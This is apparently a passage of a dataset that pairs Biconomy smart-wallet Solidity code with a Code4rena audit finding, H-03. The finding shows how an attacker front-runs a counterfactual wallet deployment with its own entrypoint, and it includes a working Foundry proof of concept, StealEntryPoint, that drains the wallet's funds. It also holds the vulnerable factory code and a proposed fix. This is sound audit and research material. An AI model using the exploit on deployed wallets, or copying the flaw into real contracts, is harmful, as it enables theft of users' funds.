require(req);\n    }\n\n    /**\n     * withdraw value from the account's deposit\n     * @param withdrawAddress target to send to\n     * @param amount to withdraw\n     */\n    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n        entryPoint().withdrawTo(withdrawAddress, amount);\n    }\n\n    /**\n     * @notice Query if a contract implements an interface\n     * @param interfaceId The interface identifier, as specified in ERC165\n     * @return `true` if the contract implements `_interfaceID`\n    */\n    function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7\n    }\n\n    // solhint-disable-next-line no-empty-blocks\n    receive() external payable {}\n}\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./Proxy.sol\";\nimport \"./BaseSmartAccount.sol\"; \n\ncontract SmartAccountFactory {\n    address immutable public _defaultImpl; \n\n    // EOA + Version tracking\n    string public constant VERSION = \"1.0.2\";\n\n    //states : registry\n    // review need and impact of this update wallet -> account\n    mapping (address => bool) public isAccountExist;\n\n    constructor(address _baseImpl) {\n        require(_baseImpl != address(0), \"base wallet address can not be zero\");\n        _defaultImpl = _baseImpl;\n    }\n\n    // event SmartAccountCreated(address indexed _proxy, address indexed _implementation, address indexed _owner);\n    // EOA + Version tracking\n    event SmartAccountCreated(address indexed _proxy, address indexed _implementation, address indexed _owner, string version, uint256 _index);\n\n    /**\n     * @notice Deploys wallet using create2 and points it to _defaultImpl\n     * @param _owner EOA signatory of the wallet\n     * @param _entryPoint AA 4337 entry point address\n     * @param _handler fallback handler address\n     * @param _index extra salt that allows to deploy more wallets if needed for same EOA (default 0)\n     */\n    function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n        bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n        }\n        require(address(proxy) != address(0), \"Create2 call failed\");\n        // EOA + Version tracking\n        emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n        BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n        isAccountExist[proxy] = true;\n    }\n\n    /**\n     * @notice Deploys wallet using create and points it to _defaultImpl\n     * @param _owner EOA signatory of the wallet\n     * @param _entryPoint AA 4337 entry point address\n     * @param _handler fallback handler address\n    */ \n    function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){ \n        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            proxy := create(0x0, add(0x20, deploymentData), mload(deploymentData))\n        }\n        BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n        isAccountExist[proxy] = true;\n    }\n\n    /**\n     * @notice Allows to find out wallet address prior to deployment\n     * @param _owner EOA signatory of the wallet\n     * @param _index extra salt that allows to deploy more wallets if needed for same EOA (default 0)\n    */\n    function getAddressForCounterfactualWallet(address _owner, uint _index) external view returns (address _wallet) {\n       bytes memory code = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n       bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n       bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));\n        _wallet = address(uint160(uint(hash)));\n    }\n\n}\n\n",
        "CodeNames": [
            "Proxy.sol",
            "SmartAccount.sol",
            "SmartAccountFactory.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\nfunction deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n    bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n    bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n    // solhint-disable-next-line no-inline-assembly\n    assembly {\n        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n    }\n    require(address(proxy) != address(0), \"Create2 call failed\");\n    // EOA + Version tracking\n    emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n    BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n    isAccountExist[proxy] = true;\n}\n",
                    "//solidity\nfunction execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n    success = execute(dest, value, func, operation, gasLimit);\n    require(success, \"Userop Failed\");\n}\n",
                    "//solidity\ncontract StealEntryPoint {\n    function steal(SmartAccount wallet) public {\n        uint256 balance = address(wallet).balance;\n\n        wallet.execFromEntryPoint(\n            msg.sender, // address dest\n            balance, // uint value\n            \"\", // bytes calldata func\n            Enum.Operation.Call, // Enum.Operation operation\n            gasleft() // uint256 gasLimit\n        );\n    }\n}\n\ncontract AuditTest is Test {\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    uint256 bobPrivateKey = 0x123;\n    uint256 attackerPrivateKey = 0x456;\n\n    address deployer;\n    address bob;\n    address attacker;\n    address entrypoint;\n    address handler;\n\n    SmartAccount public implementation;\n    SmartAccountFactory public factory;\n    MockToken public token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        bob = vm.addr(bobPrivateKey);\n        attacker = vm.addr(attackerPrivateKey);\n        entrypoint = makeAddr(\"entrypoint\");\n        handler = makeAddr(\"handler\");\n\n        vm.label(deployer, \"deployer\");\n        vm.label(bob, \"bob\");\n        vm.label(attacker, \"attacker\");\n\n        vm.startPrank(deployer);\n        implementation = new SmartAccount();\n        factory = new SmartAccountFactory(address(implementation));\n        token = new MockToken();\n        vm.stopPrank();\n    }\n    \n    function test_SmartAccountFactory_StealCounterfactualWallet() public {\n        uint256 index = 0;\n        address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);\n        // Simulate Bob sends 1 ETH to the wallet\n        uint256 amount = 1 ether;\n        vm.deal(counterfactualWallet, amount);\n\n        // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)\n        vm.startPrank(attacker);\n\n        StealEntryPoint stealer = new StealEntryPoint();\n\n        address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);\n        SmartAccount wallet = SmartAccount(payable(proxy));\n\n        // address is the same\n        assertEq(address(wallet), counterfactualWallet);\n\n        // trigger attack\n        stealer.steal(wallet);\n\n        vm.stopPrank();\n\n        // Attacker has stolen the funds\n        assertEq(address(wallet).balance, 0);\n        assertEq(attacker.balance, amount);\n    }\n}\n"
                ],
                "Type": " Attacker can gain control of counterfactual wallet",
                "Description": "*Submitted by adriro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/460), also found by 0x73696d616f(https://github.com/code-423n4/2023-01-biconomy-findings/issues/536), giovannidisiena(https://github.com/code-423n4/2023-01-biconomy-findings/issues/522), Qeew(https://github.com/code-423n4/2023-01-biconomy-findings/issues/518), V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/482), 0x1f8b(https://github.com/code-423n4/2023-01-biconomy-findings/issues/464), adriro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/458), ey88(https://github.com/code-423n4/2023-01-biconomy-findings/issues/456), wait(https://github.com/code-423n4/2023-01-biconomy-findings/issues/407), Haipls(https://github.com/code-423n4/2023-01-biconomy-findings/issues/404), betweenETHlines(https://github.com/code-423n4/2023-01-biconomy-findings/issues/369), Lirios(https://github.com/code-423n4/2023-01-biconomy-findings/issues/364), hihen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/331), hihen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/287), horsefacts(https://github.com/code-423n4/2023-01-biconomy-findings/issues/284), bin2chen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/278), ast3ros(https://github.com/code-423n4/2023-01-biconomy-findings/issues/268), aviggiano(https://github.com/code-423n4/2023-01-biconomy-findings/issues/202), 0xdeadbeef0x(https://github.com/code-423n4/2023-01-biconomy-findings/issues/176), chaduke(https://github.com/code-423n4/2023-01-biconomy-findings/issues/164), Jayus(https://github.com/code-423n4/2023-01-biconomy-findings/issues/162), ladboy233(https://github.com/code-423n4/2023-01-biconomy-findings/issues/148), ladboy233(https://github.com/code-423n4/2023-01-biconomy-findings/issues/143), zaskoh(https://github.com/code-423n4/2023-01-biconomy-findings/issues/137), Kalzak(https://github.com/code-423n4/2023-01-biconomy-findings/issues/135), dragotanqueray(https://github.com/code-423n4/2023-01-biconomy-findings/issues/95), BClabs(https://github.com/code-423n4/2023-01-biconomy-findings/issues/92), and HE1M(https://github.com/code-423n4/2023-01-biconomy-findings/issues/37)*\n\nA counterfactual wallet can be used by pre-generating its address using the SmartAccountFactory.getAddressForCounterfactualWallet function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.\n\nHowever, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:\n\n<https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45\n\nsolidity\nfunction deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n    bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n    bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n    // solhint-disable-next-line no-inline-assembly\n    assembly {\n        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n    }\n    require(address(proxy) != address(0), \"Create2 call failed\");\n    // EOA + Version tracking\n    emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n    BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n    isAccountExist[proxy] = true;\n}\n\n\nAs the entrypoint address doesn't take any role in the address generation (it isn't part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.\n\n\nAfter the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using delegatecall) using the execFromEntryPoint function:\n\n<https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492\n\nsolidity\nfunction execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n    success = execute(dest, value, func, operation, gasLimit);\n    require(success, \"Userop Failed\");\n}\n\n\nThis means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.\n\n\nIn the following test, the attacker deploys the counterfactual wallet using the StealEntryPoint contract as the entrypoint, which is then used to steal any funds present in the wallet.\n\nsolidity\ncontract StealEntryPoint {\n    function steal(SmartAccount wallet) public {\n        uint256 balance = address(wallet).balance;\n\n        wallet.execFromEntryPoint(\n            msg.sender, // address dest\n            balance, // uint value\n            \"\", // bytes calldata func\n            Enum.Operation.Call, // Enum.Operation operation\n            gasleft() // uint256 gasLimit\n        );\n    }\n}\n\ncontract AuditTest is Test {\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    uint256 bobPrivateKey = 0x123;\n    uint256 attackerPrivateKey = 0x456;\n\n    address deployer;\n    address bob;\n    address attacker;\n    address entrypoint;\n    address handler;\n\n    SmartAccount public implementation;\n    SmartAccountFactory public factory;\n    MockToken public token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        bob = vm.addr(bobPrivateKey);\n        attacker = vm.addr(attackerPrivateKey);\n        entrypoint = makeAddr(\"entrypoint\");\n        handler = makeAddr(\"handler\");\n\n        vm.label(deployer, \"deployer\");\n        vm.label(bob, \"bob\");\n        vm.label(attacker, \"attacker\");\n\n        vm.startPrank(deployer);\n        implementation = new SmartAccount();\n        factory = new SmartAccountFactory(address(implementation));\n        token = new MockToken();\n        vm.stopPrank();\n    }\n    \n    function test_SmartAccountFactory_StealCounterfactualWallet() public {\n        uint256 index = 0;\n        address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);\n        // Simulate Bob sends 1 ETH to the wallet\n        uint256 amount = 1 ether;\n        vm.deal(counterfactualWallet, amount);\n\n        // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)\n        vm.startPrank(attacker);\n\n        StealEntryPoint stealer = new StealEntryPoint();\n\n        address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);\n        SmartAccount wallet = SmartAccount(payable(proxy));\n\n        // address is the same\n        assertEq(address(wallet), counterfactualWallet);\n\n        // trigger attack\n        stealer.steal(wallet);\n\n        vm.stopPrank();\n\n        // Attacker has stolen the funds\n        assertEq(address(wallet).balance, 0);\n        assertEq(attacker.balance, amount);\n    }\n}\n\n\n",
                "Repair": "\nThis may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.\n\ngzeon (judge) commented(https://github.com/code-423n4/2023-01-biconomy-findings/issues/460#issuecomment-1384942481):\n  #278(https://github.com/code-423n4/2023-01-biconomy-findings/issues/278) also described a way to make the user tx not revert by self destructing with another call. i.e.\n \n 1. Frontrun deploy\n 2. Set approval and selfdestruct\n 3. User deploy, no revert\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/460#issuecomment-1404485844)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n    function handlePaymentRevert(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) external returns (uint256 payment) {\n        uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hpr %s\", requiredGas);\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n            // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n                // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n                require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n                uint256 contractSignatureLen;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                }\n                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n                // Check signature\n                bytes memory contractSignature;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n                    contractSignature := add(add(signatures, s), 0x20)\n                }\n                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n        }\n        else if(v > 30) {\n            // If v > 30 then default va (27,28) has been adjusted for eth_sign flow\n            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n            _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        } else {\n            _signer = ecrecover(dataHash, v, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        }\n    }\n\n    /// @dev Allows to estimate a transaction.\n    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n    /// @param to Destination address of Safe transaction.\n    /// @param value Ether value of transaction.\n    /// @param data Data payload of transaction.\n    /// @param operation Operation type of transaction.\n    /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n    function requiredTxGas(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation\n    ) external returns (uint256) {\n        uint256 startGas = gasleft();\n        // We don't provide an error message here, as we use it to return the estimate\n        require(execute(to, value, data, operation, gasleft()));\n        uint256 requiredGas = startGas - gasleft();\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /// @dev Returns hash to be signed by owner.\n    /// @param to Destination address.\n    /// @param value Ether value.\n    /// @param data Data payload.\n    /// @param operation Operation type.\n    /// @param targetTxGas Fas that should be used for the safe transaction.\n    /// @param baseGas Gas costs for data used to trigger the safe transaction.\n    /// @param gasPrice Maximum gas price that should be used for this transaction.\n    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash.\n    function getTransactionHash(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 targetTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver,\n        uint256 _nonce\n    ) public view returns (bytes32) {\n        Transaction memory _tx = Transaction({\n            to: to,\n            value: value,\n            data: data,\n            operation: operation,\n            targetTxGas: targetTxGas\n        });\n        FeeRefund memory refundInfo = FeeRefund({\n            baseGas: baseGas,\n            gasPrice: gasPrice,\n            tokenGasPriceFactor: tokenGasPriceFactor,\n            gasToken: gasToken,\n            refundReceiver: refundReceiver\n        });\n        return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n    }\n\n    /// @dev Returns the bytes that are hashed to be signed by owner.\n    /// @param _tx Wallet transaction \n    /// @param refundInfo Required information for gas refunds\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash bytes.\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n    // Extra Utils \n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n\n    function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n        IERC20 tokenContract = IERC20(token);\n        SafeERC20.safeTransfer(tokenContract, dest, amount);\n    }\n\n    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        _call(dest, value, func);\n    }\n\n    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n        